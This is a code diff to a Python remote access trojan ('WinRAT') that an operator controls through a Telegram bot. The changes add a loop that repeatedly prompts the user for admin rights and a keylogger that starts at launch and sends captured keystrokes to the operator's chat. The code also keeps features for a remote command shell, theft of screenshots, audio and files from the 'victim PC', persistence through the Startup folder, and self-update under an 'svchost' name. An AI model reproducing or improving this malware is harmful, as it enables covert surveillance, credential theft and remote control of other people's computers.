@@ -10,21 +10,20 @@ import requests
 from PIL import ImageGrab
 import datetime
 import webbrowser
-import logging
 import threading
 import pyHook, pythoncom
 from helper import RadiumKeylogger
 from helper import RecAudio
 from helper import DirectoryTree
 import subprocess
+import ctypes, sys
 
-CHAT_ID = '000000000'  #Get chat id from telegram app
-ACCESS_TOKEN = '9999999999999999999:3q3984fyq3874rhfq8374rfh8q34' # Get access token from botfather in telegram app
+CHAT_ID = '12345667868'  #Get chat id from telegram app
+ACCESS_TOKEN = '456456546:asdasda45345ASsEqbe23O' # Get access token from botfather in telegram app
 
 MAC_ADDRESS = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 PLAT_FORM = platform.platform()
 USER = getpass.getuser()
-
 
 
 # buffer = ''
@@ -55,26 +54,48 @@ get_file_tele_step = 0
 update_rat_step = 0
 # updated_RAT_path = 'firewall_updated.exe'
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
+def reqUAC():
+    bot.sendMessage(CHAT_ID, "Requesting until Admin Access is got...")
+    while is_admin() == False:
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        except Exception as e:
+            bot.sendMessage(CHAT_ID, str(e))
+            break
+        
+        time.sleep(15)
 
-
-def sendKeylogs():
-    global keylog_data
-    with open(key_log, 'r') as myfile:
-        keylog_data += myfile.read()
-    f = open(key_log, 'w').close()
-    bot.sendMessage(CHAT_ID, str(keylog_data))
+    os._exit(1)
+    quit()
     
 
+def requestUAC():
+    reqUACThread = threading.Thread(target = reqUAC)
+    reqUACThread.daemon = True
+    reqUACThread.start()
+
+def sendKeylogs(text):
+    global keylog_data
+    print("\n\ndata from file:\n" + text)
+    f = open(key_log, 'w', encoding='utf-8')
+    f.write("")
+    #f = open(key_log, 'w').close()
+    bot.sendMessage(CHAT_ID, text)
+    
 def checkKeylogSize():
     while True:
         with open(key_log, 'r') as file:
-            text = file.read().strip().split()
+            text = file.read()
             len_chars = sum(len(word) for word in text)
-        if (len_chars < 1000 and len_chars > 500) or len_chars > 1000:
-            sendKeylogs()
-        time.sleep(20)
-
+        if len_chars > 50:
+            sendKeylogs(text)
+        time.sleep(30)
 
 def internetOn(url='https://www.google.com/', timeout=5):
     try:
@@ -89,13 +110,19 @@ def internetOn(url='https://www.google.com/', timeout=5):
 
 def screenshot():
     ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
-    try:
-        scr_img = ImageGrab.grab()
-        scr_img.save(str(ts) + '.png')
-        bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER)
-        os.remove(str(ts) + '.png')
-    except Exception as e:
-        print(str(e))
+    tries = 5
+    while tries >= 0:
+        try:
+            scr_img = ImageGrab.grab()
+            scr_img.save(str(ts) + '.png')
+            bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER)
+            os.remove(str(ts) + '.png')
+            break
+        except Exception as e:
+            tries -= 1
+            bot.sendMessage(CHAT_ID, "Couldn't capture screenshot. Trying in 2 seconds. Remaining Tries: " + str(tries))
+            print(str(e))
+            time.sleep(2)
     return True
 
 
@@ -112,8 +139,7 @@ def MainMenu_Send():
     #content_type, chat_type, chat_id = telepot.glance(msg)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text= "🌟 Get Screenshot", callback_data = 'screenshot')],
-       [InlineKeyboardButton(text= "🔑 Start Keylogger", callback_data = 'start_keylogger')],
-       [InlineKeyboardButton(text= "🔒 Stop Keylogger", callback_data = 'stop_keylogger')],
+       [InlineKeyboardButton(text= "🔑 Get Keylogs", callback_data = 'get_keylogs')],
        [InlineKeyboardButton(text= "🎤 Record audio", callback_data = 'rec_audio')],
        [InlineKeyboardButton(text= "🌏 Open website", callback_data = 'open_website')],
        [InlineKeyboardButton(text= "💽 Drive List", callback_data = 'drive_list')],
@@ -121,6 +147,7 @@ def MainMenu_Send():
        [InlineKeyboardButton(text= "🔋 Run cmd command", callback_data = 'run_cmd_command')],
        [InlineKeyboardButton(text= "📥 Download a file to victim PC (via link)", callback_data = 'down_via_link')],
        [InlineKeyboardButton(text= "📧 Get a file from victim PC (via Telegram)", callback_data = 'getfile_via_tele')],
+       [InlineKeyboardButton(text= "🛡️ (Experimental) Request Admin Access", callback_data = 'request_uac')],
        [InlineKeyboardButton(text= "🐀 UPDATE RAT", callback_data = 'update_rat')]
        ]
        )
@@ -216,7 +243,7 @@ def getFileTele(step, dest):
         bot.sendMessage(CHAT_ID, "### Download Menu (via Telegram) ###\nType in the full location of the file:\n(You might need the Directory Tree first!)")
     elif step == 2:
         try:
-            bot.sendDocument(CHAT_ID, document=open(dest))
+            bot.sendDocument(CHAT_ID, document=open(dest, "rb"))
             bot.sendMessage(CHAT_ID, "File was uploaded to Telegram successfully")
         except Exception as e:
             print(str(e))
@@ -224,26 +251,25 @@ def getFileTele(step, dest):
         get_file_tele_step = 0
 
 def updateRAT(step):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-               [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
-               )
-    global update_rat_step
-    if step == 1:
-        update_rat_step = 1
-        bot.sendMessage(CHAT_ID, "Upload the updated exe:", reply_markup=keyboard)
-    elif step == 2:
-        bot.sendMessage(CHAT_ID, "Please wait while you see respond from the updated RAT!!!")
-        bat_script = "timeout /t 3 /nobreak\ndel " + "svchost" + ".exe\nren " + "svchost" + "_updated.exe" + CURR_FILE_NAME + "\nstart /MIN " + CURR_FILE_NAME + "\nEXIT"
-        with open('helper.bat', 'w') as the_file:
-            the_file.write(bat_script)
-        time.sleep(1)
-        os.system("start /min helper.bat")
-        #import sys
-        os._exit(0)
-        
-        
-
-
+    if "exe" in CURR_FILE_NAME.lower():
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
+                )
+        global update_rat_step
+        if step == 1:
+            update_rat_step = 1
+            bot.sendMessage(CHAT_ID, "Upload the updated exe:", reply_markup=keyboard)
+        elif step == 2:
+            bot.sendMessage(CHAT_ID, "Please wait while you see respond from the updated RAT!!!")
+            bat_script = "timeout /t 3 /nobreak\ndel " + "svchost" + ".exe\nren " + "svchost" + "_updated.exe" + CURR_FILE_NAME + "\nstart /MIN " + CURR_FILE_NAME + "\nEXIT"
+            with open('helper.bat', 'w') as the_file:
+                the_file.write(bat_script)
+            time.sleep(1)
+            os.system("start /min helper.bat")
+            #import sys
+            os._exit(0)
+    else:
+        bot.sendMessage(CHAT_ID, "You have to create exe for this feature!!!")
 
 def startUpWork():
     if not os.path.exists(SAVE_FILES):
@@ -257,52 +283,54 @@ def startUpWork():
     # print(CURR_FILE_PATH)
     # print('copy ' + CURR_FILE_PATH + ' ' + SAVE_FILES + "\\" )
     if os.path.isfile(STARTUP_PATH + "\\" + CURR_FILE_NAME) == False:
-        print(os.system('copy "' + CURR_FILE_PATH + '" "' + STARTUP_PATH + '\\"' ))
-    if internetOn() == True:
-        try:
-            os.system("del helper.bat")
-            #bot.sendMessage(CHAT_ID, "helper.bat was removed.\nRAT was updated successfully!!! ^_^")
-        except:
-            pass
-    
-        bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
-        screenshot()
-        MainMenu_Send()
-        return True
-    elif internetOn() == False:
-        return False
+        if "exe" in CURR_FILE_NAME.lower():
+            os.system('copy "' + CURR_FILE_PATH + '" "' + STARTUP_PATH + '\\"' )
+        else:
+            print("Py file will not be copied to startup folder. Create exe for that functionality.")
+
+    # if internetOn() == True:
+    try:
+        os.system("del helper.bat")
+        #bot.sendMessage(CHAT_ID, "helper.bat was removed.\nRAT was updated successfully!!! ^_^")
+    except:
+        pass
+
+    bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM + "\nAdmin Access: " + str(bool(is_admin())) + "\n\nType /help to get commands!")
+    screenshot()
+    # MainMenu_Send()
+
  
 def on_callback_query(msg):
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
     global keylogger_stat, cmd
     global change_rec_time_step, get_url_step, cmd_step
-    global default_download_location, url
+    global default_download_location, url, kLog, checkLog
     if query_data == 'screenshot':
         screenshot()
-        MainMenu_Send()
-    elif query_data == 'start_keylogger':
-        if keylogger_stat == 0:
-            kLog = threading.Thread(target = RadiumKeylogger.hookslaunch)
-            kLog.daemon = True
-            kLog.start()
-            keylogger_stat = 1
-            bot.sendMessage(CHAT_ID, "Keylogger deployed in " + USER + " ^_^")
-            f = open(key_log, 'w').close()
-            checkLog = threading.Thread(target = checkKeylogSize)
-            checkLog.daemon = True
-            checkLog.start()
-            MainMenu_Send()
-        else:
-            bot.sendMessage(CHAT_ID, "Keylogger has already been deployed in " + USER + " ^_^")
-            MainMenu_Send()
-    elif query_data == 'stop_keylogger':
-        RadiumKeylogger.STOP_FLAG = False
-        keylogger_stat = 0
-        bot.sendMessage(CHAT_ID, "Keylogger process killed in " + USER + "!")
+        # MainMenu_Send()
+    # elif query_data == 'start_keylogger':
+    #     if keylogger_stat == 0:
+    #         kLog = threading.Thread(target = RadiumKeylogger.hookslaunch)
+    #         kLog.daemon = True
+    #         kLog.start()
+    #         keylogger_stat = 1
+    #         bot.sendMessage(CHAT_ID, "Keylogger deployed in " + USER + " ^_^")
+    #         f = open(key_log, 'w').close()
+    #         checkLog = threading.Thread(target = checkKeylogSize)
+    #         checkLog.daemon = True
+    #         checkLog.start()
+    #         # MainMenu_Send()
+    #     else:
+    #         bot.sendMessage(CHAT_ID, "Keylogger has already been deployed in " + USER + " ^_^")
+    #         # MainMenu_Send()
+    elif query_data == 'get_keylogs':
+        # RadiumKeylogger.STOP_FLAG = False
+        # keylogger_stat = 0
+        # bot.sendMessage(CHAT_ID, "Keylogger process killed in " + USER + "!")
         with open(key_log, 'r') as myfile:
             data = myfile.read()
         bot.sendMessage(CHAT_ID, "Keylog Data from " + USER + ":\n" + data)
-        MainMenu_Send()
+        # MainMenu_Send()
     elif query_data == 'rec_audio':
         recAudioMenu(1)
     elif query_data == 'default_rec_time_change':
@@ -352,8 +380,12 @@ def on_callback_query(msg):
         download(1, url, default_download_location)
     elif query_data == 'getfile_via_tele':
         getFileTele(1, ' ')
+    elif query_data == "request_uac":
+        requestUAC()
     elif query_data == 'update_rat':
         updateRAT(1)
+    elif query_data == '/help':
+        MainMenu_Send()
 
 def on_chat_message(msg):
     global change_rec_time_step
@@ -361,9 +393,11 @@ def on_chat_message(msg):
     global get_url_step
     global url, cmd, update_rat_step
     content_type, chat_type, chat_id = telepot.glance(msg)
-    if content_type == 'text' and msg['text'] == 'whoisonline':
-        bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
+    if content_type == 'text' and msg['text'] == '/help':
         MainMenu_Send()
+    elif content_type == 'text' and msg['text'] == 'whoisonline':
+        bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
+        # MainMenu_Send()
     elif change_rec_time_step == 1:
         if content_type == 'text' and isinstance(int(msg['text']), int) == True:
             change_rec_time_step = 0
@@ -379,7 +413,7 @@ def on_chat_message(msg):
             url = msg['text']
             openWebsiteMenu(2, url)
             url = ''
-            MainMenu_Send()
+            # MainMenu_Send()
     elif cmd_step == 1:
         cmd = str(msg['text'])
         runCmd(2)
@@ -388,11 +422,11 @@ def on_chat_message(msg):
         url = msg['text']
         download(3, url, default_download_location)
         url = ''
-        MainMenu_Send()
+        # MainMenu_Send()
     elif get_file_tele_step == 1:
         get_file_tele_step == 0
         getFileTele(2, str(msg['text']))
-        MainMenu_Send()
+        # MainMenu_Send()
     elif update_rat_step == 1:
         update_rat_step = 0
         if content_type == 'text':
@@ -406,10 +440,11 @@ def on_chat_message(msg):
             except Exception as e:
                 print(str(e))
                 bot.sendMessage(CHAT_ID, "File wasn't downloaded & updated!!!")
-                MainMenu_Send()
+                # MainMenu_Send()
             
         else:
-            MainMenu_Send()
+            # MainMenu_Send()
+            pass
         
     else:
         bot.sendMessage(CHAT_ID, "Invalid Command!!!")
@@ -418,15 +453,27 @@ def on_chat_message(msg):
         
 print("WinRAT STARTED!!!")            
 
+while internetOn() == False:
+    time.sleep(10)
+
+print("Connection Established!!!")
 
 MessageLoop(bot, {'chat': on_chat_message,
                   'callback_query': on_callback_query}).run_as_thread()
 
+startUpWork()        
 print("Listening...")
-startUpWork()
-'''while startUpWork() == False:
-    startUpWork()'''
-        
+
+# Starting keylogger at startup
+kLog = threading.Thread(target = RadiumKeylogger.hookslaunch)
+kLog.daemon = True
+kLog.start()
+bot.sendMessage(CHAT_ID, "Keylogger Deployed!")
+
+# Keylog file checker thread
+checkLog = threading.Thread(target = checkKeylogSize)
+checkLog.daemon = True
+checkLog.start()
 
 while 1:
     time.sleep(10)
